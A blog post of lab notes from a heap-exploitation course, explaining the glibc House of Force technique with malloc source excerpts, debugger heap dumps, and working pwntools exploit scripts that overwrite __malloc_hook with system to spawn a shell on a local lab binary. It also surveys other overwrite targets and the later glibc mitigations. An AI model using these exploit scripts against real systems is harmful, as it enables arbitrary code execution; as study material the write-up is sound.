---
layout: post
title:  "HeapLAB 1 - House of Force"
date:   2022-12-03 19:59:43 +0300
categories: jekyll update
---

**Contents**
* TOC
{:toc}
## History

Was first documented in 2005, in [The Malloc Maleficarum][the-malloc-maleficarum].

This paper describes 5 generic heap exploitation techniques:
House of Prime, Mind, Force, Lore and Spirit. 

## House of Force - Paper

### General

This technique holds for glibc versions `< 2.29`.
The purpose of the House of Force is to exploit the wilderness (top chunk).\
This chunk also have an header, containing its size, followed by long data section.

The wilderness borders the end of available memory - and is the only chunk that can be extended or shortened. 

It must *always* exist. Realistically it should never be passed to `free()`, and never contain app data. 

So the idea is to overflow the top chunk, in such way that the wilderness pointer stores an arbitrary value - which can result with arbitrary data chunk returned to a requesting application.

Requires: 2 `malloc` calls.
The first call must contain attacker-controlled size, and the second call must be large enough to trigger the wilderness code. 


### Wilderness Code

```c
Void_t*
_int_malloc(mstate av, size_t bytes)
{
    INTERNAL_SIZE_T nb;               /* normalized request size */
    mchunkptr       victim;           /* inspected/selected chunk */
    INTERNAL_SIZE_T size;             /* its size */
    mchunkptr       remainder;        /* remainder from a split */
    unsigned long   remainder_size;   /* its size */
    ...
    checked_request2size(bytes, nb);
    ...
    use_top:
      victim = av->top;
      size = chunksize(victim);

      if ((unsigned long)(size) >= (unsigned long)(nb + MINSIZE)) {
        remainder_size = size - nb;
        remainder = chunk_at_offset(victim, nb);
        av->top = remainder;
        set_head(victim, nb | PREV_INUSE |
                 (av != &main_arena ? NON_MAIN_ARENA : 0));
        set_head(remainder, remainder_size | PREV_INUSE);
        check_malloced_chunk(av, victim, nb);
        return chunk2mem(victim);
    }
```

`av` stands for the current arena context pointer. \
`bytes` stands for the attacker-controlled requested chunk size, while `nb` is the normalized size (including header size, alignment, etc). 

`victim` is a pointer towards the top chunk, and `size` stands for its size. 

A basic sanity check is being perform, checking there is enough memory to be teared-off the top chunk towards the requested memory, while leaving at least `MINSIZE` bytes available on the top chunk.

The first goal of the House of Force, is to overwrite `av->top`, the top chunk pointer, with an arbitrary large value - preferably `0xffffffff`.

This can be done, for example, if we control the allocated chunk size, producing an under-allocation, and overflowing it with user-controlled data.

By setting the top chunk size to maximum, even large `malloc` allocations will trigger the wilderness code, instead of trying to extend the heap. 

The goal of the attacker is to control the request size, to position the `remainder`, aka the updated top chunk, to 8 bytes (due header) before a *.GOT, .dtors, .data, etc* entry. \
The only restriction on the new wilderness is that its size must be larger than the large triggering-malloc request. 

Usually, the most challenging issue about Hose of Force is having complete control on the `size` parameter being passed to `malloc`. 

For example, scenario such as:

```c
buf = (char *) malloc(strlen(str) + 1);
```

May be un-realistic to exploit - as it requires inserting a string of length `align_of(0xffffffff - 1 - 8)`. 

A more-realistic scenario is a controlled integer, determining the `malloc` allocation size.

## Exploitation

Assume we can perform an under-allocation for chunk, and overflowing it with attacker-controlled data.

The following heap layout would occur:

```bash
pwndbg> vis

0x603000        0x0000000000000000      0x0000000000000021      ........!.......
0x603010        0x0000000a59595959      0x0000000000000000      YYYY............
0x603020        0x0000000000000000      0x0000000000000021      ........!.......
0x603030        0x4141414141414141      0x4141414141414141      AAAAAAAAAAAAAAAA
0x603040        0x4141414141414141      0x4141414141414141      AAAAAAAAAAAAAAAA    <-- Top chunk
```

Meaning the top chunk `size` field was overflowed.
Note that even a single byte overflow can corrupt the size field of the succeeding chunk - including the top chunk. 

Because many versions of glibc have no top chunk integrity checks (such as glibc-2.28), malloc would take this new, corrupted value as correct. 

If the top chunk's `size` field overwritten by a large value, than from `malloc`'s view, that top chunk extend across the heap segment - for example towards *dynamically loaded libraries*, or even the *stack* (that are located at much higher addresses). 

But what if we want to overwrite an address located at lower addresses, prior to the heap segment? \
For example, the program's data segment?

The trick here is to provide an extremely large value, so that the top chunk `size` actually wraps around the maximal value of the virtual address space - back to the start. (Note - large allocations wrap-arounds are possible for glibc verion `< 2.30`).


So after overwriting the top chunk's `size` attribute to an extremely large value, we would request a large chunk, that would wrap-around the VA address space. \
Then we would issue one small request, that would return a chunk pointing towards our desired target at the data segment. 

I've executed a python POC via pwntools `GDB` and `NOASLR` CLI options. \
By overriding the first 8 bytes of the top chunk, i got the follwing heap layout:

```bash
pwndbg> vis

0x603000        0x0000000000000000      0x0000000000000021      ........!.......
0x603010        0x5959595959595959      0x5959595959595959      YYYYYYYYYYYYYYYY
0x603020        0x5959595959595959      0xffffffffffffffff      YYYYYYYY........    <-- Top chunk
```

Note the top chunk `size` metadata starts at `0x603028`, the chunk content at `0x603030`, and the whole chunk metadata at `0x603020` - 16 bytes prior to the content. 

Therefore, for our big allocation, we would like to perform a wrap around, from the *top chunk real start* (aka `0x603020`), towards 0x20 bytes prior to our goal address (lets say, `0x602010`). 

Meaning - allocation of `0xffffffff - 0x603020 + 0x602010 - 0x20`

The trick is to leave `0x20` bytes for next allocation. That way it will point exactly towards the target address.
Since the lowest possible allocation for malloc is 24 bytes of data, and 8 bytes for the `size`, it yields a minimal chunk size of 32 bytes. 

Note we *can* allocate these extra 0x20 bytes with a single `malloc`. \ 
However, it will require the exploit to fill about 0xffffffff bytes, and because some of the memory regions aren't mapped (or mapped to RODATA) - it will lead to a segfault.

POC code:

```python
#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("house_of_force")
libc = ELF(elf.runpath + b"/libc.so.6") # elf.libc broke again

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Select the "malloc" option, send size & data.
def malloc(size, data):
    io.send(b"1")
    io.sendafter(b"size: ", f"{size}".encode())
    io.sendafter(b"data: ", data)
    io.recvuntil(b"> ")

# Calculate the "wraparound" distance between two addresses.
def delta(x, y):
    return (0xffffffffffffffff - x) + y

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil(b"puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts

# This binary leaks the heap start address.
io.recvuntil(b"heap @ ")
heap = int(io.recvline(), 16)
io.recvuntil(b"> ")
io.timeout = 0.1

# =============================================================================

# =-=-=- EXAMPLE -=-=-=

# The "heap" variable holds the heap start address.
info(f"heap: 0x{heap:02x}")

# Program symbols are available via "elf.sym.<symbol name>".
info(f"target: 0x{elf.sym.target:02x}")

# The malloc() function chooses option 1 from the menu.
# Its arguments are "size" and "data".
malloc(24, b"Y"*24 + b"\xff"*8)

# Note - heap + 0x20 points towards the top chunk (8 bytes before its size metadata, 16 byts before its content)
distance = delta(heap + 0x20, elf.sym.target - 0x20)

# request the large chunk
malloc(distance, b"A")

# override the target address
malloc(24, b"B"*24)

# The delta() function finds the "wraparound" distance between two addresses.
info(f"delta between heap & main(): 0x{delta(heap, elf.sym.main):02x}")

# =============================================================================

io.interactive()
```

In order to get a shell, we may either overwrite entry at the GOT / PLT, such as `printf`, with `system` address, calculated by our leaked libc value. 

Another option is overwriting entries within the `_fini` array, which contains function pointers that will be called during the program's exit. 

However, for `FULL RELRO` binaries, these techniques aren't possible - as these sections marked as read only. 

A possible approach would be targeting a heap function pointer. 
Since this is a relative address within the heap, there is even no need for a heap address leakage primitive. \
However - no such pointers exist within this particular scenario. 

Targeting libc seems interesting. \
We have a libc leak. It may be possible to overwrite its PLT (which is writeable!) or `__exit_funcs` and `tls_dtor_list`, which are similar to `_fini` behavior (but protected with `Pointer Guard`). \
Note however it isn't trivial to trigger functions within libc, from our binary execution. 

A common heap technique for such cases are the `malloc hooks` family. \
Each core function, such as `malloc, free, realloc`, have an associated hook - which is a writeable function pointer within glibc data section.

The original idea behind these hooks, are to allow developers implement their own memory allocators, or collect malloc statistics. 

By setting the right offsets, i got the following heap layout, right after allocating the first large chunk (before allocating the small 24-bytes chunk):

```bash
0x7ffff7dd0c00  0x00007ffff7aa1bd0      0xffff800008832419      .........$......         <-- Top chunk
0x7ffff7dd0c10  0x0000000000000000      0x0000000000000000      ................
```

Within this snippet, `0x7ffff7dd0c10` is the address of `__malloc_hook` function pointer. \
By default, it is initalized to `NULL` - and ignored by `malloc` calls.

My idea is to overwrite this function pointer with the address of `system` from `glibc`. \
It can be easily found, as we have leaked libc address. 

Moreover, in order to call `system("/bin/sh")`, we have to set the "size" of the overwritten malloc call to an address, containing the string `/bin/sh`. 

Its pretty easy - we can either write the string `/bin/sh` ourself on the heap, and set the `size` to its heap address.

Another, more elegant approach is using the address of `/bin/sh` within libc as the `size` - as we have already leaked its address. 

shell POC:

```python
malloc(24, b"Y"*24 + b"\xff"*8)

# We want the next allocation (0x20) to reside on malloc hook. We substract the start address of top chunk in order to calculate the offset
distance = (libc.sym.__malloc_hook - 0x20) - (heap + 0x20)

# request the large chunk
malloc(distance, b"A")

# returns the address as integer
bin_sh = list(libc.search(b'/bin/sh'))[0]
print(f"THE BINSH IS {bin_sh}")

# override __malloc_hook with system address
malloc(24, p64(libc.sym.system))

# trigger call to system(bin_sh)
malloc(bin_sh, b"")
```

## Advanced Techniques

### Heap Target

If the target address lays on the same heap as the corrupted top chunk, no need for heap address leak - as the target address is relative to the top chunk address. 

### malloc_hook

Valuable heap function pointer targets would be the `malloc_hook` family.
By overwriting such pointer with the address of `system`, then passing `/bin/sh` pointer as an allocation size, code execution would be achieved. 

### .fini and .fini_array

When the process terminates, this section contains the instructions that will be executed.

If a shellcode would be written into the `.fini` section address, it will be executed by the system after the main function returns. \
Note - usually the `.fini` section is just a `R-X` section, containing few instructions that will be called at the process termination.

For most cases, we would like to find structures holding the pointer towards the `.fini` section - and overwrite that pointer towards a function of our wish (for example, see the `.dynamic` example).

Another, more popular trick is to overwrite pointer at `.fini_array`, which is usually a writeable section. 

Note that a shared object may also have initializers and finalizers within their `.init and .fini`, not only executables!

Important: the linker processes its termination sections at the following order: (`.fini_array`, `.fini`). \
Equivalent for `init` are the `.pre_initarray, .init_array, .init` sections. 

### .dtors

The full technique is described within the following [link][dtors-technique], which is a paper from the year of 2000.

The `.ctors, .dtors` are actually legacy versions of the modern `.fini_array` - but the same idea holds. 

Note they have reversed the functions execution order. 

### .dynamic

Described [here][dynamic-technique]. \
This section contains information about all other sections within the binary, used for dynamic linking. 

For example, it contains the address of the `.fini` section. \
That way, the linker can resolve the `.fini` address of the binary. 

It means that in case the `.fini` entry within the `.dynamic` would be overwritten to certain function pointer, upon an exit - this new function pointer would be executed! 

Easy-pissy. 

### __exit_funcs

The internal implementation of `exit`, actually calls `__run_exit_handlers`. This function first issues `__call_tls_dtors`, in case it isn't a `NULL` ptr. 

Apperently there is alot of info about exit handlers, i will look into this more deeply in a future post: [link1][exit-handlers], [link2][exit-handlers2], [link3][exit-handlers3], [link4][exit-handlers4], [link5][exit-handlers5], [link6][exit-handlers6], [link7][exit-handlers7], [link8][exit-handlers8], [link9][exit-handlers9], [link10][exit-handlers10].

### tls_dtor_list

Will add a future post about it.

### __call_tls_dtors

Will add a future post about it.

## Mitigations

GLIBC 2.29 adds top chunk `size` sanity check - so that it cannot exceed its arena's `system_mem`. 

GLIBC 2.30 adds a maximum allocation size check for malloc - limiting possible wrap-arounds. 

[the-malloc-maleficarum]: https://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt
[dtors-technique]: https://lwn.net/2000/1214/a/sec-dtors.php3
[dynamic-technique]: https://thibaut.sautereau.fr/2016/09/09/bypassing-aslr-overwriting-the-dynamic-section/
[exit-handlers]: http://binholic.blogspot.com/2017/05/notes-on-abusing-exit-handlers.html
[exit-handlers2]: https://buffer.antifork.org/security/heap_atexit.txt
[exit-handlers3]: https://ctftime.org/writeup/34804
[exit-handlers4]: http://www.sis.pitt.edu/jjoshi/courses/IS2620/Fall17/Lecture4.pdf
[exit-handlers5]: https://www.tooboat.com/?p=655
[exit-handlers6]: https://flylib.com/books/en/1.545.1.34/1/
[exit-handlers7]: http://images.china-pub.com/ebook3765001-3770000/3768102/ch03.pdf
[exit-handlers8]: https://github.com/bash-c/HITCON-Training-Writeup/blob/master/writeup.md
[exit-handlers9]: https://shotgh.tistory.com/98
[exit-handlers10]: https://0x00sec.org/t/0x00ctf-writeup-babyheap-left/5314
